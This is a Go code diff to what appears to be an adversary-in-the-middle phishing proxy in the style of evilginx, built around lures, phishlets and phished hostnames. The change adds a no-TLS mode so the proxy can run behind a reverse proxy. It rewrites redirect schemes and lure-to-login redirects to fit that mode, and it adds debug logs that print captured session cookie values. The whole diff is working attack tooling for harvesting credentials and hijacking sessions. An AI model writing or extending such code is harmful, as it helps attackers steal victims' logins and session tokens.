@@ -77,6 +77,8 @@ type HttpProxy struct {
 	cookieName        string
 	last_sid          int
 	developer         bool
+	notls             bool
+	preserveHttps     bool
 	ip_whitelist      map[string]int64
 	ip_sids           map[string]string
 	auto_filter_mimes []string
@@ -106,7 +108,7 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, notls bool, preserveHttps bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -118,6 +120,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
+		notls:             notls,
+		preserveHttps:     preserveHttps,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
@@ -147,12 +151,35 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.Verbose = false
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
-		req.URL.Scheme = "https"
+		if p.notls {
+			if p.preserveHttps {
+				// In notls mode with preserve-https, keep HTTPS scheme
+				req.URL.Scheme = "https"
+			} else {
+				// In notls mode without preserve-https, use HTTP scheme
+				req.URL.Scheme = "http"
+			}
+		} else {
+			req.URL.Scheme = "https"
+		}
 		req.URL.Host = req.Host
 		p.Proxy.ServeHTTP(w, req)
 	})
 
-	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
+	if p.notls {
+		// In notls mode, reject all CONNECT requests (HTTPS)
+		// unless preserve-https is enabled, in which case we don't expect CONNECT at all
+		if p.preserveHttps {
+			// With preserve-https, client will send HTTP requests with HTTPS scheme preserved
+			// No CONNECT expected, but if it comes, reject it
+			p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysReject)
+		} else {
+			// Without preserve-https, reject CONNECT
+			p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysReject)
+		}
+	} else {
+		p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
+	}
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
@@ -202,7 +229,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
+			// Determine the correct scheme to use for internal URLs
+			// In notls mode without preserve-https, use HTTP
+			// In notls mode with preserve-https, use HTTPS (for reverse proxy)
+			// In normal mode, use HTTPS
+			req_scheme := req.URL.Scheme
+			if p.notls {
+				if p.preserveHttps {
+					// Preserve HTTPS scheme for reverse proxy
+					req_scheme = "https"
+				} else {
+					// Use HTTP scheme when not preserving HTTPS
+					req_scheme = "http"
+				}
+			} else {
+				// Normal mode - always HTTPS
+				req_scheme = "https"
+			}
+
+			req_url := req_scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
@@ -308,8 +353,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					var create_session bool = true
 					var ok bool = false
 					sc, err := req.Cookie(session_cookie)
+					log.Debug("[%s] checking for session cookie '%s' for path '%s': %v", pl_name, session_cookie, req_path, err)
 					if err == nil {
 						ps.Index, ok = p.sids[sc.Value]
+						log.Debug("[%s] session cookie value: %s, found in sessions: %v", pl_name, sc.Value, ok)
 						if ok {
 							create_session = false
 							ps.SessionId = sc.Value
@@ -588,8 +635,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
-						// redirect from lure path to login url
-						rurl := pl.GetLoginUrl()
+						// redirect from lure path to login url using the correct scheme
+						rurl := pl.GetLoginUrlWithScheme(req_scheme)
 						u, err := url.Parse(rurl)
 						if err == nil {
 							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
@@ -947,6 +994,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if err == nil {
 				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
 					r_url.Host = r_host
+					// In notls mode, convert HTTPS redirects to HTTP
+					if p.notls && r_url.Scheme == "https" {
+						r_url.Scheme = "http"
+					}
 					resp.Header.Set("Location", r_url.String())
 				}
 			}
@@ -1869,7 +1920,20 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 }
 
 func (p *HttpProxy) Start() error {
-	go p.httpsWorker()
+	if p.notls {
+		// In notls mode, start a simple HTTP listener
+		go func() {
+			p.isRunning = true
+			log.Info("http: starting in notls mode on %s", p.Server.Addr)
+			if err := p.Server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
+				log.Error("http: server error: %s", err)
+			}
+			p.isRunning = false
+		}()
+	} else {
+		// In HTTPS mode, start with SNI listener
+		go p.httpsWorker()
+	}
 	return nil
 }
 
